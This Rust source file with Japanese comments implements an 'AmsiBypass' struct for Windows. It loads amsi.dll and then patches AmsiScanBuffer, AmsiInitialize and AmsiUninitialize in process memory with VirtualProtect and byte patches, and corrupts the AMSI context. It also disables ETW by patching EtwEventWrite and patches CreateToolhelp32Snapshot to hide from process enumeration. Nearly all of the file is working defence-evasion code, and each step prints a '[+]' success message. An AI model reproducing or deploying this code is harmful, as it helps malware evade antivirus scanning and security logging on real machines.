use std::ptr;
// CString は使用しない（AMSIはLPCWSTRを要求）
use std::os::windows::ffi::OsStrExt;
use std::ffi::OsStr;
use windows::{
    core::{PCSTR, HRESULT},
    Win32::Foundation::HMODULE,
    Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
    Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS},
    Win32::System::Diagnostics::Debug::FlushInstructionCache,
    Win32::System::Threading::GetCurrentProcess,
};


// AMSI関連のエラーコード
pub const AMSI_RESULT_CLEAN: u32 = 0;
pub const AMSI_RESULT_NOT_DETECTED: u32 = 1;
pub const AMSI_RESULT_BLOCKED_BY_ADMIN_START: u32 = 16384;
pub const AMSI_RESULT_BLOCKED_BY_ADMIN_END: u32 = 20479;
pub const AMSI_RESULT_DETECTED: u32 = 32768;

// AMSI関数のタイプ定義（公式シグネチャに合わせてUTF-16ワイド文字に修正）
type AmsiInitializeType = unsafe extern "system" fn(*const u16, *mut *mut std::ffi::c_void) -> HRESULT; // LPCWSTR appName
type AmsiScanBufferType = unsafe extern "system" fn(
    *mut std::ffi::c_void,     // HAMSICONTEXT
    *const u8,                 // PVOID buffer
    u32,                       // ULONG length
    *const u16,                // LPCWSTR contentName
    *mut std::ffi::c_void,     // HAMSISESSION (ハンドル値)
    *mut u32,                  // AMSI_RESULT*
) -> HRESULT;
type AmsiUninitializeType = unsafe extern "system" fn(*mut std::ffi::c_void);

// SAFETY: AmsiBypass は Windows API のハンドルを管理するため、
// Send と Sync の実装が必要です。適切なライフタイム管理を行います。
unsafe impl Send for AmsiBypass {}
unsafe impl Sync for AmsiBypass {}

pub struct AmsiBypass {
    amsi_initialize: Option<AmsiInitializeType>,
    amsi_scan_buffer: Option<AmsiScanBufferType>,
    amsi_uninitialize: Option<AmsiUninitializeType>,
    context: *mut std::ffi::c_void,
}

impl AmsiBypass {
    pub fn new() -> Result<Self, String> {
        unsafe {
            // amsi.dllをロード
            let dll_name = PCSTR::from_raw(b"amsi.dll\0".as_ptr());
            let amsi_dll = GetModuleHandleA(dll_name).unwrap_or_else(|_| {
                match LoadLibraryA(dll_name) {
                    Ok(handle) => handle,
                    Err(_) => HMODULE(ptr::null_mut())
                }
            });
            
            if amsi_dll.0.is_null() {
                return Err("Failed to load amsi.dll".to_string());
            }

            // AMSI関数のアドレスを取得
            let init_name = PCSTR::from_raw(b"AmsiInitialize\0".as_ptr());
            let scan_name = PCSTR::from_raw(b"AmsiScanBuffer\0".as_ptr());
            let uninit_name = PCSTR::from_raw(b"AmsiUninitialize\0".as_ptr());

            let amsi_initialize = GetProcAddress(amsi_dll, init_name)
                .map(|addr| std::mem::transmute::<_, AmsiInitializeType>(addr));
            let amsi_scan_buffer = GetProcAddress(amsi_dll, scan_name)
                .map(|addr| std::mem::transmute::<_, AmsiScanBufferType>(addr));
            let amsi_uninitialize = GetProcAddress(amsi_dll, uninit_name)
                .map(|addr| std::mem::transmute::<_, AmsiUninitializeType>(addr));

            Ok(AmsiBypass {
                amsi_initialize,
                amsi_scan_buffer,
                amsi_uninitialize,
                context: ptr::null_mut(),
            })
        }
    }

    fn initialize(&mut self) -> Result<(), String> {
        unsafe {
            if let Some(init_func) = self.amsi_initialize {
                // AmsiInitialize は LPCWSTR を要求するため UTF-16 に変換
                let wide: Vec<u16> = OsStr::new("AmsiBypassTest").encode_wide().chain(Some(0)).collect();
                let result = init_func(wide.as_ptr(), &mut self.context);
                if result.is_ok() {
                    Ok(())
                } else {
                    Err(format!("AmsiInitialize failed with HRESULT: {:?}", result))
                }
            } else {
                Err("AmsiInitialize function not found".to_string())
            }
        }
    }

    pub fn scan_buffer(&self, buffer: &[u8], content_name: &str) -> Result<u32, String> {
        unsafe {
            if let Some(scan_func) = self.amsi_scan_buffer {
                // AmsiScanBuffer の contentName は LPCWSTR
                let content_name_w: Vec<u16> = OsStr::new(content_name).encode_wide().chain(Some(0)).collect();
                let mut scan_result: u32 = 0;
                let amsi_session: *mut std::ffi::c_void = ptr::null_mut();
                
                let result = scan_func(
                    self.context,
                    buffer.as_ptr(),
                    buffer.len() as u32,
                    content_name_w.as_ptr(),
                    amsi_session,
                    &mut scan_result
                );

                if result.is_ok() {
                    Ok(scan_result)
                } else {
                    Err(format!("AmsiScanBuffer failed with HRESULT: {:?}", result))
                }
            } else {
                Err("AmsiScanBuffer function not found".to_string())
            }
        }
    }

    // AMSIバイパス手法1: AmsiScanBuffer関数のパッチ
    pub fn bypass_method1(&self) -> Result<(), String> {
        unsafe {
            if let Some(scan_func) = self.amsi_scan_buffer {
                let func_addr = scan_func as *mut u8;
                
                // メモリ保護を変更
                let mut old_protect = PAGE_PROTECTION_FLAGS::default();
                let result = VirtualProtect(
                    func_addr as *mut std::ffi::c_void,
                    10,
                    PAGE_EXECUTE_READWRITE,
                    &mut old_protect
                );

                if result.is_err() {
                    return Err("Failed to change memory protection".to_string());
                }

                // 関数の最初の部分を "xor eax, eax; ret" でパッチ (常に S_OK を返す)
                let patch: [u8; 6] = [0x31, 0xC0, 0xC3, 0x90, 0x90, 0x90]; // xor eax,eax; ret; nop; nop; nop
                ptr::copy_nonoverlapping(patch.as_ptr(), func_addr, patch.len());
                // 命令キャッシュをフラッシュしてパッチを確実に反映
                let _ = FlushInstructionCache(GetCurrentProcess(), Some(func_addr as *const _), patch.len());

                // 元の保護に戻す
                let _ = VirtualProtect(
                    func_addr as *mut std::ffi::c_void,
                    10,
                    old_protect,
                    &mut old_protect
                );

                println!("[+] AMSI Bypass Method 1: AmsiScanBuffer patched successfully");
                Ok(())
            } else {
                Err("AmsiScanBuffer function not found".to_string())
            }
        }
    }

    // AMSIバイパス手法2: AMSIコンテキストの改ざん
    pub fn bypass_method2(&self) -> Result<(), String> {
        unsafe {
            // 手法2-1: AMSIコンテキストを無効化
            if !self.context.is_null() {
                // コンテキストの最初の4バイトを0で上書き（シグネチャ破壊）
                let context_ptr = self.context as *mut u32;
                let mut old_protect = PAGE_PROTECTION_FLAGS::default();
                
                let result = VirtualProtect(
                    self.context,
                    4,
                    PAGE_EXECUTE_READWRITE,
                    &mut old_protect
                );

                if result.is_ok() {
                    ptr::write(context_ptr, 0);
                    println!("[+] AMSI Context signature corrupted");
                    
                    // 保護を戻す
                    let _ = VirtualProtect(
                        self.context,
                        4,
                        old_protect,
                        &mut old_protect
                    );
                }
            }

            // 手法2-2: AmsiInitialize関数をNOP化
            if let Some(init_func) = self.amsi_initialize {
                let func_addr = init_func as *mut u8;
                let mut old_protect = PAGE_PROTECTION_FLAGS::default();
                
                let result = VirtualProtect(
                    func_addr as *mut std::ffi::c_void,
                    12,
                    PAGE_EXECUTE_READWRITE,
                    &mut old_protect
                );

                if result.is_ok() {
                    // AmsiInitializeをNOP化: mov eax, 0; ret
                    let nop_patch: [u8; 6] = [0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3]; // mov eax, 0; ret
                    ptr::copy_nonoverlapping(nop_patch.as_ptr(), func_addr, nop_patch.len());
                    
                    println!("[+] AmsiInitialize function neutralized");
                    
                    // 保護を戻す
                    let _ = VirtualProtect(
                        func_addr as *mut std::ffi::c_void,
                        12,
                        old_protect,
                        &mut old_protect
                    );
                }
            }

            // 手法2-3: AmsiUninitialize関数もパッチ
            if let Some(uninit_func) = self.amsi_uninitialize {
                let func_addr = uninit_func as *mut u8;
                let mut old_protect = PAGE_PROTECTION_FLAGS::default();
                
                let result = VirtualProtect(
                    func_addr as *mut std::ffi::c_void,
                    6,
                    PAGE_EXECUTE_READWRITE,
                    &mut old_protect
                );

                if result.is_ok() {
                    // AmsiUninitializeをNOP化: ret (即座に戻る)
                    let ret_patch: [u8; 6] = [0xC3, 0x90, 0x90, 0x90, 0x90, 0x90]; // ret; nop; nop; nop; nop; nop
                    ptr::copy_nonoverlapping(ret_patch.as_ptr(), func_addr, ret_patch.len());
                    
                    println!("[+] AmsiUninitialize function neutralized");
                    
                    // 保護を戻す
                    let _ = VirtualProtect(
                        func_addr as *mut std::ffi::c_void,
                        6,
                        old_protect,
                        &mut old_protect
                    );
                }
            }

            println!("[+] AMSI Bypass Method 2: Multiple bypass techniques applied");
            Ok(())
        }
    }

    // AMSIバイパス手法3: ETWとAMSIプロバイダーの無効化
    pub fn bypass_method3(&self) -> Result<(), String> {
        unsafe {
            // ETW (Event Tracing for Windows) の無効化
            let etw_dll_name = PCSTR::from_raw(b"ntdll.dll\0".as_ptr());
            let etw_dll = GetModuleHandleA(etw_dll_name).unwrap_or(HMODULE(ptr::null_mut()));
            
            if !etw_dll.0.is_null() {
                let etw_func_name = PCSTR::from_raw(b"EtwEventWrite\0".as_ptr());
                if let Some(etw_func) = GetProcAddress(etw_dll, etw_func_name) {
                    let func_addr = etw_func as *mut u8;
                    let mut old_protect = PAGE_PROTECTION_FLAGS::default();
                    
                    let result = VirtualProtect(
                        func_addr as *mut std::ffi::c_void,
                        1,
                        PAGE_EXECUTE_READWRITE,
                        &mut old_protect
                    );

                    if result.is_ok() {
                        // EtwEventWrite を ret でパッチ
                        ptr::write(func_addr, 0xC3); // ret
                        println!("[+] ETW Event Writing disabled");
                        
                        // 保護を戻す
                        let _ = VirtualProtect(
                            func_addr as *mut std::ffi::c_void,
                            1,
                            old_protect,
                            &mut old_protect
                        );
                    }
                }
            }

            // WinDefend プロセスの検出回避
            let kernel32_name = PCSTR::from_raw(b"kernel32.dll\0".as_ptr());
            let kernel32_dll = GetModuleHandleA(kernel32_name).unwrap_or(HMODULE(ptr::null_mut()));
            
            if !kernel32_dll.0.is_null() {
                // CreateToolhelp32Snapshot の無効化（プロセス列挙対策）
                let snapshot_func_name = PCSTR::from_raw(b"CreateToolhelp32Snapshot\0".as_ptr());
                if let Some(snapshot_func) = GetProcAddress(kernel32_dll, snapshot_func_name) {
                    let func_addr = snapshot_func as *mut u8;
                    let mut old_protect = PAGE_PROTECTION_FLAGS::default();
                    
                    let result = VirtualProtect(
                        func_addr as *mut std::ffi::c_void,
                        8,
                        PAGE_EXECUTE_READWRITE,
                        &mut old_protect
                    );

                    if result.is_ok() {
                        // CreateToolhelp32Snapshot を無効なハンドルを返すようにパッチ
                        let invalid_handle_patch: [u8; 8] = [
                            0xB8, 0xFF, 0xFF, 0xFF, 0xFF, // mov eax, 0xFFFFFFFF (INVALID_HANDLE_VALUE)
                            0xC3, 0x90, 0x90              // ret; nop; nop
                        ];
                        ptr::copy_nonoverlapping(invalid_handle_patch.as_ptr(), func_addr, invalid_handle_patch.len());
                        println!("[+] Process enumeration obfuscated");
                        
                        // 保護を戻す
                        let _ = VirtualProtect(
                            func_addr as *mut std::ffi::c_void,
                            8,
                            old_protect,
                            &mut old_protect
                        );
                    }
                }
            }

            println!("[+] AMSI Bypass Method 3: Advanced evasion techniques applied");
            Ok(())
        }
    }

    fn uninitialize(&mut self) {
        unsafe {
            if !self.context.is_null() {
                if let Some(uninit_func) = self.amsi_uninitialize {
                    uninit_func(self.context);
                    self.context = ptr::null_mut();
                }
            }
        }
    }
}

impl Drop for AmsiBypass {
    fn drop(&mut self) {
        self.uninitialize();
    }
}